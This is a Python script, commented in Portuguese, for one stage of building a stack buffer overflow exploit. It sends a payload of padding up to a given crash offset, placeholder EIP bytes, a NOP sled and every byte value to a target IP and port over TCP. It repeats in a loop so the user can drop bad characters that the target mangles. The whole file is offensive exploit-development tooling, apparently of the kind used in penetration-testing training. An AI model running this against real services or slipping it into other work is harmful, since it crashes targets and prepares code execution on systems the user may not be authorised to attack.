#!/usr/bin/python

import argparse
import socket
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")

# Analisar os argumentos
args = parser.parse_args()
    
# BadChars com todos caracteres apresentados em ordem natural
badchars = [
    b"\x00", b"\x01", b"\x02", b"\x03", b"\x04", b"\x05", b"\x06", b"\x07",
    b"\x08", b"\x09", b"\x0a", b"\x0b", b"\x0c", b"\x0d", b"\x0e", b"\x0f",
    b"\x10", b"\x11", b"\x12", b"\x13", b"\x14", b"\x15", b"\x16", b"\x17",
    b"\x18", b"\x19", b"\x1a", b"\x1b", b"\x1c", b"\x1d", b"\x1e", b"\x1f",
    b"\x20", b"\x21", b"\x22", b"\x23", b"\x24", b"\x25", b"\x26", b"\x27",
    b"\x28", b"\x29", b"\x2a", b"\x2b", b"\x2c", b"\x2d", b"\x2e", b"\x2f",
    b"\x30", b"\x31", b"\x32", b"\x33", b"\x34", b"\x35", b"\x36", b"\x37",
    b"\x38", b"\x39", b"\x3a", b"\x3b", b"\x3c", b"\x3d", b"\x3e", b"\x3f",
    b"\x40", b"\x41", b"\x42", b"\x43", b"\x44", b"\x45", b"\x46", b"\x47",
    b"\x48", b"\x49", b"\x4a", b"\x4b", b"\x4c", b"\x4d", b"\x4e", b"\x4f",
    b"\x50", b"\x51", b"\x52", b"\x53", b"\x54", b"\x55", b"\x56", b"\x57",
    b"\x58", b"\x59", b"\x5a", b"\x5b", b"\x5c", b"\x5d", b"\x5e", b"\x5f",
    b"\x60", b"\x61", b"\x62", b"\x63", b"\x64", b"\x65", b"\x66", b"\x67",
    b"\x68", b"\x69", b"\x6a", b"\x6b", b"\x6c", b"\x6d", b"\x6e", b"\x6f",
    b"\x70", b"\x71", b"\x72", b"\x73", b"\x74", b"\x75", b"\x76", b"\x77",
    b"\x78", b"\x79", b"\x7a", b"\x7b", b"\x7c", b"\x7d", b"\x7e", b"\x7f",
    b"\x80", b"\x81", b"\x82", b"\x83", b"\x84", b"\x85", b"\x86", b"\x87",
    b"\x88", b"\x89", b"\x8a", b"\x8b", b"\x8c", b"\x8d", b"\x8e", b"\x8f",
    b"\x90", b"\x91", b"\x92", b"\x93", b"\x94", b"\x95", b"\x96", b"\x97",
    b"\x98", b"\x99", b"\x9a", b"\x9b", b"\x9c", b"\x9d", b"\x9e", b"\x9f",
    b"\xa0", b"\xa1", b"\xa2", b"\xa3", b"\xa4", b"\xa5", b"\xa6", b"\xa7",
    b"\xa8", b"\xa9", b"\xaa", b"\xab", b"\xac", b"\xad", b"\xae", b"\xaf",
    b"\xb0", b"\xb1", b"\xb2", b"\xb3", b"\xb4", b"\xb5", b"\xb6", b"\xb7",
    b"\xb8", b"\xb9", b"\xba", b"\xbb", b"\xbc", b"\xbd", b"\xbe", b"\xbf",
    b"\xc0", b"\xc1", b"\xc2", b"\xc3", b"\xc4", b"\xc5", b"\xc6", b"\xc7",
    b"\xc8", b"\xc9", b"\xca", b"\xcb", b"\xcc", b"\xcd", b"\xce", b"\xcf",
    b"\xd0", b"\xd1", b"\xd2", b"\xd3", b"\xd4", b"\xd5", b"\xd6", b"\xd7",
    b"\xd8", b"\xd9", b"\xda", b"\xdb", b"\xdc", b"\xdd", b"\xde", b"\xdf",
    b"\xe0", b"\xe1", b"\xe2", b"\xe3", b"\xe4", b"\xe5", b"\xe6", b"\xe7",
    b"\xe8", b"\xe9", b"\xea", b"\xeb", b"\xec", b"\xed", b"\xee", b"\xef",
    b"\xf0", b"\xf1", b"\xf2", b"\xf3", b"\xf4", b"\xf5", b"\xf6", b"\xf7",
    b"\xf8", b"\xf9", b"\xfa", b"\xfb", b"\xfc", b"\xfd", b"\xfe", b"\xff"
]

# Lista para armazenar badchars eliminados
removed_badchars = []

# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
eip = 4

while True:
    payload = b"A"*offset
    payload += b"B"*eip
    payload += b"\x90"*16 # NOPs
    payload += b"".join(badchars) # Converter a lista de badchars para um único objeto de bytes

    try:
        # Cria conexão e envia o payload
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((client_ip, client_port))
        print("[+] Enviando Buffer de {} 'A', {} 'B' e {} Badchars [+]\n".format(str(offset), str(eip), len(badchars)))
        client.send(payload)
    except ConnectionResetError:
        print(f"Reset Error!")

    # Perguntar ao usuário se deseja eliminar um item específico da lista
    print("RESETE A APLICAÇÃO")
    resposta = input("Deseja eliminar um item específico da lista de badchars? (s/n): ").strip().lower()
    if resposta == 's':
        # Solicitar ao usuário o valor decimal do item a ser removido
        try:
            valor = int(input("Digite o valor que deseja remover: "),16)
            if 0 <= valor <= 255:
                badchar = bytes([valor])
                if badchar in badchars:
                    badchars.remove(badchar)
                    removed_badchars.append(f'\\x{badchar.hex()}')
                    print(f"Item {badchar} removido da lista de badchars.")
                else:
                    print("Item não encontrado na lista. Tente novamente.")
            else:
                print("Valor fora do intervalo. Tente novamente.")
        except ValueError:
            print("Entrada inválida.")
    elif resposta == 'n':
        print("Saindo do loop.")
        break

# Imprimir a lista de badchars eliminados após sair do loop
print("Badchars eliminados: " + ''.join(removed_badchars))
#print("Badchars eliminados: " + ''.join(f"{char.hex()}" for char in removed_badchars))
